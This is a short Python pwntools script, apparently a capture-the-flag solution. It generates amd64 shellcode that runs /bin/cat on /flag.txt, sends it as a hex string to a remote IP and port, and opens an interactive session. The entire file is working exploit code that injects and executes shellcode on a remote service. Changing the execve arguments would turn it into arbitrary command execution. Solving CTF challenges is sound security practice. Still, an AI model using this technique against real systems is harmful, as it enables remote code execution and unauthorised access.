#!/usr/bin/python3
from pwn import *
import sys

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <IP> <PORT>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = int(sys.argv[2])
    
    context.arch = 'amd64'
    
    # Generate shellcode
    shellcode = asm(shellcraft.execve('/bin/cat', ['/bin/cat', '/flag.txt']))
    
    # Send as HEX STRING, not binary!
    shellcode_hex = shellcode.hex()
    
    print(f"[*] Generated shellcode ({len(shellcode)} bytes)")
    print(f"[*] Sending as hex string: {shellcode_hex}")
    
    io = remote(ip, port)
    
    # Send as ASCII hex string
    io.sendline(shellcode_hex.encode())
    
    io.interactive()

if __name__ == "__main__":
    main()
